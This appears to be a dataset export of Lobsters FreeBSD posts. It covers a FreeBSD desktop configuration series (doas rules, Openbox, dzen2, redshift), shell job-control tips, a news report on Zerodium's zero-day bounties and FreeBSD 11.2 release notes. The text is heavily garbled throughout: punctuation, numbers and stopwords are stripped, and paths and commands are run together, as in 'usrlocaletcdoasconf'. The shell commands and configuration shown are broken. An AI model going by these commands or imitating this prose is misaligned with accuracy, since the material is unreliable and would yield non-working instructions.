desktop sed e home home user g done startup configured xinitrc xsession file grep tint xinitrc remember put end line doas make script work user vuk series need wheel operator network group doas sudo equivalent need installed configured following way pkg install doas pw groupmod wheel vuk pw groupmod operator vuk pw groupmod network vuk cat usrlocaletcdoasconf permit nopass wheel root permit nopass network root cmd ifconfig permit nopass network root cmd dhclient permit nopass network root cmd umount permit nopass network root cmd wpasupplicant permit nopass network root cmd ppp permit nopass network root cmd killall args dhclient permit nopass network root cmd killall args wpasupplicant permit nopass network root cmd killall args ppp permit nopass network root cmd cat args etcppppppconf permit nopass network root cmd etcrcdnetif args onerestart permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd tee args etcresolvconf script one new script added scriptsnfssh others already published previous targz file also optional may na resource would want mount maybe prefer sshfs cifs share also uploaded script individual file github page make sure remain executable chmod x script make work properly add script path variable beginning xinitrc file path script export path path script script mysterious line end statistic check script run one delete echo scriptsstats basename thus needed create stats directory mkdir p scriptsstats implemented two month ago result wc l scriptsstats sort n homevermadenscriptsstatsopenboxeditwallpapergimpsh homevermadenscriptsstatsopenboxrestartlxpanelsh homevermadenscriptsstatsopenboxshowscreenshotsh homevermadenscriptsstatsopenboxstatstopcpukillsh homevermadenscriptsstatsopenboxstatstopmemrenicesh homevermadenscriptsstatsopenboxfullscreensh homevermadenscriptsstatsopenboxstatstopcpurenicesh homevermadenscriptsstatsopenboxcurrentwallpapersh homevermadenscriptsstatsopenboxcpufreqsh homevermadenscriptsstatsopenboxdmenush homevermadenscriptsstatsopenboxvirtualboxsh homevermadenscriptsstatsopenboxdeletewallpapersh homevermadenscriptsstatsopenboxrestartconkysh homevermadenscriptsstatsopenboxrestartplanksh homevermadenscriptsstatsopenboxlocksh homevermadenscriptsstatsnfssh homevermadenscriptsstatsopenboxfreebsdsoundsh homevermadenscriptsstatsopenboxlockzzzsh homevermadenscriptsstatsopenboxeditscreenshotsh homevermadenscriptsstatsaerosnapsh homevermadenscriptsstatsshotsh homevermadenscriptsstatsnetworksh homevermadenscriptsstatsxdotoolsh homevermadenscriptsstatsxtermsh homevermadenscriptsstatsrandomwallpapersh homevermadenscriptsstatsconkyifipsh homevermadenscriptsstatsconkyifdnssh homevermadenscriptsstatsconkyifgwsh homevermadenscriptsstatsconkybatterysh homevermadenscriptsstatsconkyifpingsh homevermadenscriptsstatsdesktopkillshitsh total course limited output script available article patient come later dependency make script work generally make setup work need dependency caja chromium deadbeef firefox galculator geany gimp leafpad midori pidgin xterm thunar thunderbird transmissiongtk feh xkill install pkg type line pkg install caja chromium deadbeef firefox galculator midori geany gimp leafpad xterm thunar xkill transmissiongtk thunderbird feh pidgin finished making top bar needed information status bar server applicationswindows covered task bar eof like like loading related
347,Lobsters,freebsd,FreeBSD,Ghost in the Shell - Part 2,https://vermaden.wordpress.com/2018/07/08/ghost-in-the-shell-part-2/,ghost shell part,ghost shell global page alias argument alias alias l alias lsgls grep lsg gfx color pattern grep grepcolor color number echo grepcolor alias grep color alias grepgrep color export alias grepgrep color dmesg grep smp smp smp smp xterm process management job l galculator job job l ctrl z bg fg job kill job l galculator z job bg job l kill fg bg kill sigstop kill sigcont fg bg fg bg kill kill kill kill sigcont galculator z bg xcalc z job l kill job l kill sigcont bg job l man kill man signal disown init disown job init galculator z bg job l disown job l pgrep galculator pstree p xterm xterm zsh init pstree p pgrep p galculator nohup disown disown nohup nohupout nohup ctrl z bg nohup galculator z bg job l init pstree p ctrl c galculator path alias unalias caja unalias caja caja smylers binwhich record session script script script cat le r script script scriptout l uname spr exit cat scriptout le r scriptout le scriptout edit command executing editor fc l fc fc l editor l fc l h wq enter editor l l h edit view vi le vi vi le uname spr l le etcrcconf vim etcrcconf le v editor reset reset like,article ghost shell series first post blog busy writing various server related article recently freebsd desktop series time part ghost shell series may want check article ghost shell series ghost shell global page find link episode series along table content episode content let start something simple yet powerful time saving alias argument one may course write function similar job keeping track maintaining function becomes complicated one organize partially applies alias smaller easier maintain whole function modern shell alias also argument able parse appropriate function job basic use example alias argument l gfx info misc script tmp alias lsgls grep lsg gfx gfx color grep pattern already touched grep command topic let make usable highlighting found result color grepcolor variable used purpose expects number color table numbercolor format color number black red green yellow blue magenta cyan white may well use bold output adding number example echo grepcolor also make alias grep color argument like alias grepgrep color look practice export alias grepgrep color dmesg grep smp freebsdsmp multiprocessor system detected cpu freebsdsmp package x core smp ap cpu launched look xterm terminal process management one useful unix system matter server desktop command operand help u manage process started hand fg bg job kill disown nohup ctrl z ctrl c probably already know start command background mean tell block terminal add ampersand end command command magically go away long running visible job command may use l switch also show pid background process galculator job running galculator job l running galculator forget add ampersand end command wanted put background hit ctrl z shortcut control key small z letter process put suspended state several option process background bg command default us last suspended job also bring back foreground blocking terminal fg command also list state job course kill either pid showed job l command specifying process number case example galculator z zsh suspended galculator job suspended galculator bg continued galculator job l running galculator kill terminated galculator fg bg allow put command background foreground respectively process suspended state one may ask switch process suspended state already running background done kill signal called sigstop also bring back suspended process running state kill signal called sigcont use fg bg command difference fg bg command direct kill command kill inform user changed process may well use kill sigcont syntax kill sigcont readable galculator z zsh suspended galculator bg continued galculator xcalc z zsh suspended xcalc job l running galculator suspended xcalc kill suspended signal galculator job l suspended signal galculator suspended xcalc kill sigcont bg continued xcalc job l running galculator running xcalc also check man kill man signal information disown magic helper start long running job directly terminal without screen tmux need disconnect terminal example taking laptop depending setting current shell process background may killed moved pid init course ppid parent pid achieve used disown command disown process longer show job command run pinned init process disconnect terminal session galculator z zsh suspended galculator bg continued galculator job l running galculator disown job l pgrep galculator pstree p root sbininit vermaden xterm vermaden zsh zsh vermaden galculator still pinned shell xterm terminal close xterm window kill zsh shell switch init ppid parent pid pstree p root sbininit vermaden galculator pgrep p galculator left nohup use already great disown magic well disown always available need put command long background run disconnect best possible option default nohup command log output started command nohupout file remember nohup still run process foreground put background use ampersand ctrl z bg combo nohup galculator appending output nohupout z zsh suspended nohup galculator bg continued nohup galculator job l running nohup galculator pstree p root sbininit vermaden xterm vermaden zsh zsh vermaden galculator disconnect process switched init ppid pstree p root sbininit vermaden galculator may course end running process foreground ctrl c shortcut probably already known mention completeness guide galculator c command show full path executable found first directory path variable also show alias used command one one may ask find information absolute executable path show alias instead well use unalias command would showing full path caja caja aliased caja browser nodesktop unalias caja caja usrlocalbincaja also sure check smylers comment difference shell builtin binwhich command record session used putty mobaxterm work appreciate possibility saving terminal output file foe example documentation purpose also available natively shell using script command remember script record also special character like color properly replay session may want either use script cat command use le r argument example recorded script session script scriptout script started output file scriptout l gfx info misc script tmp unixpng uname spr freebsd exit script done output file scriptout cat scriptout script started sun jul mail l grep gfx gfx uname spr freebsd exit exit script done sun jul le r scriptout script started sun jul mail l grep gfx gfx uname spr freebsd exit exit script done sun jul le scriptout script started sun jul mail l grep gfx esc k uname spr freebsd exit exit script done sun jul edit command executing sometimes long multiline command execute often crafted favorite editor pasted terminal omit copying pasting yo may want check fc command serf similar purpose type command example simple l command type fc command fc take l command favorite text editor editor variable allow edit save exit editor execute let see behave example l gfx book download script fc taken editor vi case l unmodified line let made change l l h wq hit enter exit editor execute command total drwxrxrx vermaden vermaden book drwxrxrx vermaden vermaden download drwxrxrx vermaden vermaden gfx drwx vermaden vermaden script may show command pressing key check executed l l h edit view working multiadmin environment especially debugging one admin may block admin work using vi favorite editor browse file content good practice case using le instead vi frustrates admins type vi need change something way freebsd le uname spr freebsd l le usrbinless usrbinmore blocked example shown second admin wanted browse etcrcconf file first one already vim etcrcconf attention found swap file name etcrcconfswp owned root dated sun jul file name etcrcconf modified user name root host name process id still running opening file etcrcconf dated fri jul another program may editing file case careful end two different instance file making change quit continue caution edit session file crashed case use recover vim r etcrcconf recover change see help recovery already delete swap file etcrcconfswp avoid message swap file etcrcconfswp already exists pen readonly e dit anyway r ecover q uit bort le come handy open file block access need edit something hi v key small v letter open file editor editor make change reset last least often paste much terminal becomes fragile broken reset stable proper state use reset command reset hope find useful see part sometime eof like like loading related
348,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 13 - Configuration - Dzen2,https://vermaden.wordpress.com/2018/07/05/freebsd-desktop-part-13-configuration-dzen2/,freebsd desktop part configuration,freebsd desktop global page feature iso refresh demand mkfifo crontab scriptsstatusbartargz scriptstargz xinitrc xsession grep dzen xinitrc crontab crontab l scroll scroll scriptsxdotoolsh doas vuk wheel operator network doas sudo pkg install doas pw groupmod wheel vuk pw groupmod operator vuk pw groupmod network vuk cat usrlocaletcdoasconf script scriptsstatusbartargz script tar tf scriptsstatusbartargz chmod x script script path xinitrc echo scriptsstats basename mkdir p scriptsstats wc l scriptsstats sort n dependency pkg pkg install xdotool wmctrl crontab crontab crontab crontab l shortcut scroll scroll right click middle click left click like,time real configuration status bar today article freebsd desktop series describe configure may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content feature provided status bar backed providing following information date date iso format along current time sys cpu frequency cpu temperature system load free ram ip list current ip address interface gw system default network gateway dns system default dns ping current internet access state volpcm volume level vol pcm backends f zfs pool free space bat battery ac status top top process highest cpu usage along ram usage look like action offer feature conky status bar application offer would call refresh demand would like implement refresh interval second example often also refresh information everytime click status bar action possible implement using mkfifo command anyone would want implement strange refresh policy get battery life mostly need information refreshed every second need date information refresh manually click status bar needed information reason focus status bar refreshes every second cache attention may prevent focusing deep enough task currently something important requires focus want status bar anything else distract useless moment information achieve configuration would need three thing script start initial fifo file update fifo would run crontab every second action configured left mouse button click invoke update fifo script script used directly gather needed information available scriptsstatusbartargz file start startup use script earlier bulk already available kill instance start fifo backed script available scriptstargz file configured xinitrc xsession file grep dzen xinitrc remember put end line let look update configured crontab shown crontab l devnull script us gather information scriptsconkyifipsh scriptsconkyifgwsh scriptsconkyifdnssh scriptsconkyifpingsh scriptsconkybatterysh one emulate click implement openbox virtual desktop switching scroll scroll mouse event scriptsxdotoolsh kinda like conky terminal put information text format color syntax shown fg aaaaaa date fg eeeeee fg fg aaaaaa sys fg eeeeee fg fg aaaaaa ip fg eeeeee fg fg aaaaaa gw fg eeeeee fg fg aaaaaa dns fg eeeeee fg fg aaaaaa ping fg eeeeee fg nope fg fg aaaaaa volpcm fg eeeeee fg fg aaaaaa f fg eeeeee fg fg aaaaaa bat fg eeeeee acfg ffffff fg fg aaaaaa top fg eeeeee doas make script work user vuk series need wheel operator network group doas sudo equivalent need installed configured following way pkg install doas pw groupmod wheel vuk pw groupmod operator vuk pw groupmod network vuk cat usrlocaletcdoasconf permit nopass wheel root permit nopass network root cmd ifconfig permit nopass network root cmd dhclient permit nopass network root cmd umount permit nopass network root cmd wpasupplicant permit nopass network root cmd ppp permit nopass network root cmd killall args dhclient permit nopass network root cmd killall args wpasupplicant permit nopass network root cmd killall args ppp permit nopass network root cmd cat args etcppppppconf permit nopass network root cmd etcrcdnetif args onerestart permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd tee args etcresolvconf script post attach script related download scriptsstatusbartargz file unpack script directory script tar tf scriptsstatusbartargz scriptsxdotoolsh scriptsconkyifipsh scriptsconkyifgwsh scriptsconkyifdnssh scriptsconkyifpingsh scriptsconkybatterysh make sure remain executable chmod x script make work properly add script path variable beginning xinitrc file path script export path path script script mysterious line end statistic check script run one delete echo scriptsstats basename thus needed create stats directory mkdir p scriptsstats implemented two month ago result wc l scriptsstats sort n homevermadenscriptsstatsopenboxshowscreenshotsh homevermadenscriptsstatsopenboxcpufreqsh homevermadenscriptsstatsopenboxcurrentwallpapersh homevermadenscriptsstatsopenboxfullscreensh homevermadenscriptsstatsopenboxdmenush homevermadenscriptsstatsopenboxrestartconkysh homevermadenscriptsstatsopenboxdeletewallpapersh homevermadenscriptsstatsopenboxfreebsdsoundsh homevermadenscriptsstatsaerosnapsh homevermadenscriptsstatsopenboxeditscreenshotsh homevermadenscriptsstatsopenboxlockzzzsh homevermadenscriptsstatsopenboxlocksh homevermadenscriptsstatsshotsh homevermadenscriptsstatsnetworksh homevermadenscriptsstatsxtermsh homevermadenscriptsstatsrandomwallpapersh homevermadenscriptsstatsdesktopbatterywarningsh homevermadenscriptsstatsdesktopkillshitsh total course limited output script available article patient come later dependency make script work generally make setup work need dependency install pkg type line pkg install xdotool wmctrl crontab adding crontab keeping earlier entry complete crontab would look like crontab l desktop scriptsdesktopkillshitsh devnull devnull scriptsdesktopbatterywarningsh scriptsrandomwallpapersh gfxwallpapers devnull devnull usrbinfind cache mtime delete devnull devnull usrbinfind localsharetrashfiles mtime delete devnull devnull devnull shortcut configuration implement five mouse action shortcut available status bar scroll switch next virtual desktop scroll switch previous virtual desktop right click show openbox root menu middle click show openbox window menu left click update status bar invoke hope forgot anything feel free ask remind eof like like loading related
349,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 12 - Configuration - Openbox,https://vermaden.wordpress.com/2018/07/01/freebsd-desktop-part-12-configuration-openbox/,freebsd desktop part configuration openbox,freebsd desktop global page feature top p networksh xterm doas vuk wheel operator network doas sudo pkg install doas pw groupmod wheel vuk pw groupmod operator vuk pw groupmod network vuk cat usrlocaletcdoasconf script scriptstargz script find script sort chmod x script script path xinitrc echo scriptsstats basename mkdir p scriptsstats wc l scriptsstats sort n dependency pkg pkg install geany caja thunar libreoffice galculator pidgin firefox chrome midori abiword deadbeef transmissiongtk gnumeric audacity filezilla zenity gimp lupe recorder xvidcap xterm xrdb scrot feh wmctrl xdotool viewnior plank conky matescreensaver xlockmore powerdxx arandr gfontview galculator qtconfig sakura leafpad dmenu htop gfxwallpapers gfxscreenshots mkdir p gfxwallpapers mkdir p gfxscreenshots crontab crontab crontab l font fontstargz font find font fcmatch fcmatch fira sans fcmatch ubuntu mono openbox configopenboxmenuxml configopenboxrcxml xinitrc xsession configopenboxautostart configopenboxenvironment configopenboxicons openboxtargz configopenbox find configopenbox maxdepth openbox theme flat http wwwboxlookorg openboxflatthemetargz theme find themesopenboxflat openbox freebsd submenu system top p sound recent screenshot wallpaper cpu utility network daemon networksh shortcut super shortcut virtual desktop alt alt alt alt shift alt shift alt shift alt shift alt shortcut menu super space super alt space alt space shortcut window management alt tab shift alt tab ctrl alt q ctrl alt f alt alt alt esc shortcut advanced aero snap super super super left super right super ctrl super ctrl super alt super alt super esc shortcut mouse scroll desktop scroll desktop scroll unshaded window titlebar scroll shaded window titlebar middle click window titlebar right click window titlebar left click window titlebar icon middle click window titlebar icon shortcut various ctrl shift esc xterm htop doas super e super e super super r dmenu super l alt shift super l ctrl printscreen shift ctrl printscreen shortcut volume super alt pageup super alt pagedown lenovo thinkpad precision wireless mouse alt mouse scroll upscroll left wheel right wheel random wallpaper scriptsrandomwallpapersh gfxwallpapers crontab random theme xterm xdefaults xterm scriptsxtermsh configxdefaults xterm vermaden vermadenold xterm xterm iconstargz find icon xtermtargz find xdefaults configxdefaults update integration freebsd network management script like,time cut bullshit actually make real configuration today article freebsd desktop series describe configure openbox window manager may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content feature comparing earlier article series huge sorry could cut smaller part would require editing openbox configuration shortcut menu sake simplicity better put big mistake fix asap list feature available openbox configuration nice looking openbox theme openbox menu static nice looking icon openbox menu freebsd top p command config fileslogs openbox menu freebsd default sound output openbox menu shortcut freebsd sound volume increasedecrease openbox menu freebsd cpu frequency scaling openbox menu freebsd network management networksh script openbox menu screenshotswallpapers management openbox menu recent file random wallpaper handling random xterm theme every terminal start lost great theme openbox shortcut script aero snap like behavior openbox dmenu shortcut integration openbox configured nice font openbox shortcut important task warning low battery laptop probably forgot dozen feature let know comment openbox menu window border window switching would look like file needed configuration doas make script work user vuk series need wheel operator network group doas sudo equivalent need installed configured following way pkg install doas pw groupmod wheel vuk pw groupmod operator vuk pw groupmod network vuk cat usrlocaletcdoasconf permit nopass wheel root permit nopass network root cmd ifconfig permit nopass network root cmd dhclient permit nopass network root cmd umount permit nopass network root cmd wpasupplicant permit nopass network root cmd ppp permit nopass network root cmd killall args dhclient permit nopass network root cmd killall args wpasupplicant permit nopass network root cmd killall args ppp permit nopass network root cmd cat args etcppppppconf permit nopass network root cmd etcrcdnetif args onerestart permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd tee args etcresolvconf script post attach script made used year since started use freebsd desktop download scriptstargz file unpack script make look like find script sort scriptsopenboxcpufreqsh scriptsopenboxcurrentwallpapersh scriptsopenboxdeletewallpapersh scriptsopenboxdmenush scriptsopenboxeditscreenshotsh scriptsopenboxeditwallpapergimpsh scriptsopenboxfreebsdsoundsh scriptsopenboxlockzzzsh scriptsopenboxlocksh scriptsopenboxrecentsh scriptsopenboxreloadwallpapersh scriptsopenboxrestartconkysh scriptsopenboxrestartplanksh scriptsopenboxshowscreenshotsh scriptsopenboxstatspskillallsh scriptsopenboxstatstopcpukillsh scriptsopenboxstatstopcpurenicesh scriptsopenboxstatstopmemkillsh scriptsopenboxstatstopmemrenicesh scriptsaerosnapsh scriptsfccachesh scriptsfirefoxcleansh scriptsnetworksh scriptsrandomwallpapersh scriptsshotsh scriptsxtermsh scriptsdesktopkillshitsh scriptsdesktopbatterywarningsh make sure remain executable chmod x script make work properly add script path variable beginning xinitrc file path script export path path script script mysterious line end statistic check script run one delete echo scriptsstats basename thus needed create stats directory mkdir p scriptsstats implemented two month ago result wc l scriptsstats sort n homevermadenscriptsstatsopenboxshowscreenshotsh homevermadenscriptsstatsopenboxcpufreqsh homevermadenscriptsstatsopenboxcurrentwallpapersh homevermadenscriptsstatsopenboxfullscreensh homevermadenscriptsstatsopenboxdmenush homevermadenscriptsstatsopenboxrestartconkysh homevermadenscriptsstatsopenboxdeletewallpapersh homevermadenscriptsstatsopenboxfreebsdsoundsh homevermadenscriptsstatsaerosnapsh homevermadenscriptsstatsopenboxeditscreenshotsh homevermadenscriptsstatsopenboxlockzzzsh homevermadenscriptsstatsopenboxlocksh homevermadenscriptsstatsshotsh homevermadenscriptsstatsnetworksh homevermadenscriptsstatsxtermsh homevermadenscriptsstatsrandomwallpapersh homevermadenscriptsstatsdesktopbatterywarningsh homevermadenscriptsstatsdesktopkillshitsh total course limited output script available article patient come later dependency make script work generally make setup work need dependency arandr sakura leafpad geany caja thunar libreoffice galculator pidgin firefox chrome deadbeef transmissiongtk gnumeric abiword audacity filezilla midori gimp lupe xvidcap zenity xterm xrdb scrot feh wmctrl xdotool viewnior plank conky matescreensaver xlockmore gimp dmenu powerdxx htop galculator install pkg type line pkg install geany caja thunar libreoffice galculator pidgin firefox chrome midori abiword deadbeef transmissiongtk gnumeric audacity filezilla zenity gimp lupe recorder xvidcap xterm xrdb scrot feh wmctrl xdotool viewnior plank conky matescreensaver xlockmore powerdxx arandr gfontview galculator qtconfig sakura leafpad dmenu htop also assume wallpaper kept gfxwallpapers dir screenshots made gfxscreenshots directory let create mkdir p gfxwallpapers mkdir p gfxscreenshots crontab script need put crontab work entry crontab l desktop scriptsdesktopkillshitsh devnull devnull scriptsdesktopbatterywarningsh scriptsrandomwallpapersh gfxwallpapers devnull devnull usrbinfind cache mtime delete devnull devnull usrbinfind localsharetrashfiles mtime delete devnull devnull font use ubuntu mono font openbox menu fira sans font openbox window bar title thus download fontstargz file extract like font directory exists create find font fontsfirasansbolditalicotf fontsfirasansboldotf fontsfirasansitalicotf fontsfirasansregularotf fontsubuntumonobolditalicttf fontsubuntumonoboldttf fontsubuntumonoitalicttf fontsubuntumonoregularttf make sure openbox see verify using fcmatch command like fcmatch fira sans firasansregularotf fira sans regular fcmatch ubuntu mono ubuntumonoregularttf ubuntu mono regular openbox openbox consists mostly two file configopenboxmenuxml configopenboxrcxml also two pointless use set environment start appsdaemons xinitrc file xsession symlink anyway configopenboxautostart configopenboxenvironment icon openbox menu kept configopenboxicons directory download whole openbox configuration openboxtargz file unpack configopenbox make look like find configopenbox maxdepth configopenbox configopenboxrcxml configopenboxmenuxml configopenboxicons configopenboxenvironment configopenboxautostart openbox theme theme use start openbox flat made remember put online http wwwboxlookorg site matter grab openboxflatthemetargz file unpack like theme directory create exists find themesopenboxflat themesopenboxflat openbox freebsd submenu system openbox submenu freebsd top p command config fileslogs sound openbox submenu freebsd default sound output selection recent openbox submenu recent file check screenshot wallpaper openbox submenu screenshotswallpapers management check cpu utility openbox submenu freebsd cpu frequency scaling check network daemon openbox submenu freebsd network management networksh script shortcut let start basic one super called window key shortcut virtual desktop alt switch virtual desktop alt switch virtual desktop alt switch virtual desktop alt switch virtual desktop shift alt move current window virtual desktop shift alt move current window virtual desktop shift alt move current window virtual desktop shift alt move current window virtual desktop shortcut menu super space show openbox root menu super alt space show openbox window list menu alt space show current window option menu client menu shortcut window management alt tab cycle window focus forward shift alt tab cycle window focus backward ctrl alt q close current window ctrl alt f put current window info fullscreen alt shade current window alt minimize current window alt esc send current window window shortcut advanced aero snap super move window half screen top super move window half screen bottom super left move window half screen left super right move window half screen right super ctrl move window topleft part screen super ctrl move window bottomleft part screen super alt move window topright part screen super alt move window bottomright part screen super esc move window center without fullscreen shortcut mouse scroll desktop previous virtual desktop scroll desktop next virtual desktop scroll unshaded window titlebar shade current window scroll shaded window titlebar unshade current window middle click window titlebar send window background right click window titlebar show window option menu client menu left click window titlebar icon show window option menu client menu middle click window titlebar icon close window shortcut various ctrl shift esc launch xterm htop started doas root provilages super e start explorer caja primary file manager super e start thunar secondary file manager super show desktop minimize window super r launch dmenu starter super l lock screen alt shift super l lock screen go sleep ctrl printscreen make screenshot whole screen shift ctrl printscreen make screenshot current window click without moving mouse selection select part screen shortcut volume two work keyboard super alt pageup increase volume super alt pagedown decrease volume mouse mouse button wheel like lenovo thinkpad precision wireless mouse example use alt key mouse scroll upscroll desktop increasedecrease volume mouse left wheel decrease right wheel increase volume random wallpaper random wallpaper handling done scriptsrandomwallpapersh script sure put image gfxwallpapers directory make work configure crontab properly shown earlier random xterm theme random xterm theme every startup need three thing xdefaults default config file used xterm scriptsxtermsh script configxdefaults directory xterm theme gathered theme internet vermaden vermadenold theme created little preview included xterm theme make xterm icon look better also need iconstargz file download extract end result looking follows find icon iconsvermadenxtermxpm download extract xtermtargz file make content look like find xdefaults configxdefaults configxdefaults configxdefaultsxdefaultsthemealienblood configxdefaultsxdefaultsthemearthur configxdefaultsxdefaultsthemeearthsong configxdefaultsxdefaultsthemeelemental configxdefaultsxdefaultsthemeelementary configxdefaultsxdefaultsthemeelic configxdefaultsxdefaultsthemeflatui configxdefaultsxdefaultsthemefreya configxdefaultsxdefaultsthemefrontenddelight configxdefaultsxdefaultsthemegithub configxdefaultsxdefaultsthemegrey configxdefaultsxdefaultsthemegruvboxdark configxdefaultsxdefaultsthemegruvboxlight configxdefaultsxdefaultsthemegruvboxtilix configxdefaultsxdefaultsthemeharper configxdefaultsxdefaultsthemehemisulight configxdefaultsxdefaultsthemehighway configxdefaultsxdefaultsthemeicgreenppl configxdefaultsxdefaultsthememolokai configxdefaultsxdefaultsthememonokaisoda configxdefaultsxdefaultsthemeneopolitan configxdefaultsxdefaultsthemepali configxdefaultsxdefaultsthemepapercolour configxdefaultsxdefaultsthemesolarized configxdefaultsxdefaultsthemesolarizedlight configxdefaultsxdefaultsthemespacedust configxdefaultsxdefaultsthemetomorrow configxdefaultsxdefaultsthemetwilight configxdefaultsxdefaultsthemevermaden configxdefaultsxdefaultsthemevermadenold thats lot information one article feel free ask anything related thing might forgot put update networksh integration article described manage various network source networksh script freebsd network management networksh script available example integration networksh script openbox window manager code used configopenboxmenuxml file course integrate networksh script almost anything command eof like like loading related
350,Lobsters,freebsd,FreeBSD,"Rewards of Up to $500,000 Offered for FreeBSD, OpenBSD, NetBSD, Linux Zero-Days",https://www.bleepingcomputer.com/news/security/rewards-of-up-to-500-000-offered-for-freebsd-openbsd-netbsd-linux-zero-days/,reward offered freebsd openbsd netbsd linux zerodays,zeroday acquisition program bsd zeroday reward par linux payouts announced zeroday price varies based exploitation chain io io adobe flash player mobile im apps tor browser webhosting software microsoft outlook android linux zerodays server reach exceptional amount becoming crowded market company accused prize million already paid million,exploit broker zerodium offering reward zerodays unixbased operating system like openbsd freebsd netbsd also linux distros ubuntu centos debian tail offer first advertised via twitter earlier week available part company latest zeroday acquisition drive zerodium known buying zerodays selling government agency law enforcement company run regular zeroday acquisition program website often hold special drive substantial reward need zerodays specific category bsd zeroday reward par linux payouts usbased company held previous drive increased reward linux zerodays february reward going high another zeroday acquisition drive announced twitter week company said looking linux zerodays also exploit targeting bsd system time around reward go right exploit zerodium told bleeping computer aligning temporary reward bsd system usual payouts linux distros company usual payouts linux privilege escalation exploit range local privilege escalation lpe reward even reach exploit exceptional quality coverage example linux kernel exploit affecting major distribution payouts linux remote code execution rce exploit bring depending targeted softwareservice market share highest reward usually awarded lpes rces affecting centos ubuntu distros zeroday price varies based exploitation chain acquisition price submitted zeroday directly tied requirement term user interaction click one click two click etc zerodium said factor include exploit reliability success rate number vulnerability chained together final exploit work chained bug mean chance exploit break unexpectedly o configuration needed exploit work exploit valued work default o configs prior recent acquisition drive targeting bsd system zerodium held drive zeroday exploit targeting io io adobe flash player mobile im apps tor browser webhosting software microsoft outlook android linux company made name held acquisition drive offering exorbitant prize io zerodays million reward part company standard price chart remote jailbreak persistence exploit targeting iphone device valued million zerodays server reach exceptional amount price difference system mostly driven market share zerodium founder chaouki bekrar told bleeping computer via email desktop environment window lead market exploit window usually valuable linux say however server environment linux attracts interest customer reward reach exceptional amount obviously mobile exploit remain expensive valuable asset industry due market penetration usefulness operational perspective bekrar added asked logic behind acquisition drive pay increased reward bekrar told bleeping computer following aim always time two fully functional exploit every major software hardware operating system meaning time time would promote specific softwaresystem social medium acquire new code strengthen existing capability extend may also react customer request operational need bekrar said becoming crowded market since zerodium drew everyone attention exploit brokerage market market gotten crowded also sleazy company accused selling zerodays government agency country oppressive dictatorial regime often used political oponents journalist dissident instead going real criminal latest company broke zeroday brokerage market crowdfense recently launched acquisition program prize million already paid million researcher
351,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 11 - Key Components - Blue Light Spectrum Suppress,https://vermaden.wordpress.com/2018/06/28/freebsd-desktop-part-11-key-components-blue-light-spectrum-suppress/,freebsd desktop part key component blue light spectrum suppress,blue light spectrum suppress blue light spectrum suppress freebsd desktop global page wikipedia wikipedia flux linux binary compatibility xfluxtgz http justgetfluxcomlinuxhtml uname mro file scriptsbinxflux xinitrc xsession redshift xinitrc xsession difference like,part freebsd desktop series would like describe key component self made custom desktop environment window manager status bar task bar wallpaper handling application launcher keyboardmouse shortcut locking solution blue light spectrum suppress today focus blue light spectrum suppress component next series component configuration would also described along eventual needed script may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content latest version popular operating system like mac o x macos window uptodate android based device already provide feature automatically adjusts color temperature screen according current time location short sun color temperature closer sun eveningnight around never heard circadian rhythm check wikipedia page detail basically kind hour internal clock run background brain switch sleepiness alertness regular interval also known sleepawake cycle light especially temperature light directly affect cycle use blue spectrum light sun disrupting circadian rhythm cite wikipedia study also shown light direct effect human health way influence circadian rhythm also blue led lighting suppresses melatonin production five time orangeyellow highpressure sodium hp light body produce melatonin become sleepy something preventing production like blue light spectrum getting sleepy circadian rhythm get broken put two image side side one color temperature one color temperature able spot difference tool manage temperature make transition smooth unwatchable kill application nightevening able spot difference daily temperature nightly temperature know two tool resolve problem environment flux would want run closed source software use open source thing personally use redshift want mention flux redshift project admits program inspired flux cite flux page make color computer display adapt time day warm night like sunlight day flux provide native binary freebsd offer binary linux freebsd provides linux binary compatibility possible use freebsd linux binary flux available download tar archive xfluxtgz http justgetfluxcomlinuxhtml page look freebsd uname mro freebsd file scriptsbinxflux homevermadenxflux elf lsb executable intel version gnulinux dynamically linked interpreter gnulinux buildid stripped use flux start xinitrc xsession file like pathtobinxflux l g course latitude longitude localization redshift solution propose use open source blue light spectrum suppressor cite project site redshift adjusts color temperature screen according surroundings similarly like flux start redshift put xinitrc xsession file like redshift l g like earlier latitude longitude localization difference one tell difference without using application suppress blue light spectrum sun able tell difference instantly leave enabled think month later used app able choose stay something till late like go sleep example could choose make good sleep go bed started use application first flux lately redshift become sleepytired harder stay late think sleep become better overall better millage may vary check eof like like loading related
352,Lobsters,freebsd,FreeBSD,FreeBSD 11.2-RELEASE Available,https://www.freebsd.org/releases/11.2R/relnotes.html,freebsd available,userland application change note contributed software,section cover change addition userland application contributed software system utility userland application changesthe ln utility updated correct behavior f flag unlinking existing directory creating symbolic link crontab utility updated include new flag f force crontab removal r used noninteractively newsyslog utility updated support message rotating system log sesutil utility updated include libxo support output sponsored gandinet diskinfo utility updated include two new flag display disk identity usually serial number p display physical path disk storage controller p flag mutually exclusive used flag diskinfo utility also updated include device model flag used top utility updated allow filtering multiple user name u flag used bsdgrep utility updated include rgrep hard link grep used equivalent grep r bsdgrep utility updated address various issue pattern matching behavior umount utility updated include new flag n used forcefully unmount nfs mounted filesystem pw utility updated properly handle empty secondary group list argument g flag using usermod subcommand getconf utility updated include new flag print name value system path configuration value stdout optionally file argument sponsored chelsio communication p utility updated reflect realtime idle priority state flag p utility updated display process running capsicum capability mode indicated c cpucontrol utility updated include new flag n disables default microcode update search path used fsckffs utility updated prevent filesystem reported modified timestamp superblock updated diskinfo utility updated display disk rotation rate trimunmap supported disk sponsored spectrum logic rsh utility updated include new flag n disables shutdown socket sending path used pfctl utility updated allow routeto properly handle network interface multiple ip address camcontrol utility updated include zac zoneddevice ata command set information identify subcommand used sponsored spectrum logic pw utility updated correct handling account expiration period mdmfs utility updated support tmpfs lint utility longer built default withlint srcconf option added enable building installing utility cpucontrol utility updated include new flag e used reevaluate reported cpu feature applying firmware update note cpucontrol e flag used microcode update applied cpu system otherwise system instability may experienced processor feature identical across system indent utility updated respect simplebackupsuffix environment variable set du utility updated include si long option used display output humanreadable output power df utility updated include si long option alias h service utility updated include new flag j used interact service running within jail argument j either name numeric jail id fsckffs utility updated exit nonzero status filesystem repaired sponsored dell 